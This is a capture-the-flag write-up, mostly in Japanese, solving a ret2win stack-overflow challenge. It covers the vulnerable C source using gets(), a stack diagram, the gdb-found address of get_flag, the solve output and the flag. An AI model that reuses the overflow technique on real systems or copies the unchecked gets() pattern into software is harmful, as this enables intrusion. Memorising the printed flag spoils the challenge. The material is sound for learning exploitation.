# p0wn3d_3 - Pwn

Time for a little bit of control flow redirection

nc p0wn3d3.kctf-453514-codelab.kctf.cloud 1337
Unlock Hint for 0 points
Hint: look up what ret2win is


与えられたソースコード
```
#include <stdio.h>
#include <string.h>
#include <unistd.h>



void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
	 char *args[] = {"/bin/cat", "flag.txt", NULL};
   execve(args[0], args, NULL);
}

int main(void) 
{
	char buf[32];
  ignore(); /* ignore this function */

  printf("Now this is an original challenge. I don't think I've ever seen something like this before\n");
  sleep(2);
	gets(buf);
	puts("Drumroll please!");
	sleep(2);

  return 0;
}
```

## solve

ret2winの脆弱性を利用する
>スタックオーバーフローを利用して、リターンアドレスを書き換え、プログラムの正常な実行フローから特定のwin関数（この場合はget_flag()）にリダイレクトする手法

- gets(buf)関数が使用されていて、長さチェックがないためバッファオーバーフロー脆弱性がある
- bufは32バイトしかありませんが、getsは入力の長さを制限してない
- get_flag()関数があり、呼び出されれば/bin/cat flag.txtを実行してフラグを表示する

```
[ スタック構造 ]
| AAAA.... (32バイト)  |  ← バッファ (buf)
| Saved RBP (8バイト)  |  ← 上書き可能
| Return Address (8バイト) |  ← ここを書き換えれば制御可能！
```

リターンアドレスget_flag()のアドレスを調べる
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  execve@plt
0x0000000000401050  gets@plt
0x0000000000401060  setvbuf@plt
0x0000000000401070  sleep@plt
0x0000000000401080  _start
0x00000000004010b0  _dl_relocate_static_pie
0x00000000004010c0  deregister_tm_clones
0x00000000004010f0  register_tm_clones
0x0000000000401130  __do_global_dtors_aux
0x0000000000401160  frame_dummy
0x0000000000401162  ignore
0x00000000004011a5  get_flag
0x00000000004011e0  main
0x0000000000401230  __libc_csu_init
0x0000000000401290  __libc_csu_fini
0x0000000000401294  _fini
(gdb) exit
```
0x4011a5がリターンアドレスget_flagと分かった


出力
```
$ python3 solve.py
[+] Opening connection to p0wn3d3.kctf-453514-codelab.kctf.cloud on port 1337: Done
== proof-of-work: disabled ==

[*] Switching to interactive mode
Drumroll please!
wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}
[*] Got EOF while reading in interactive
```

## flag
`wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}`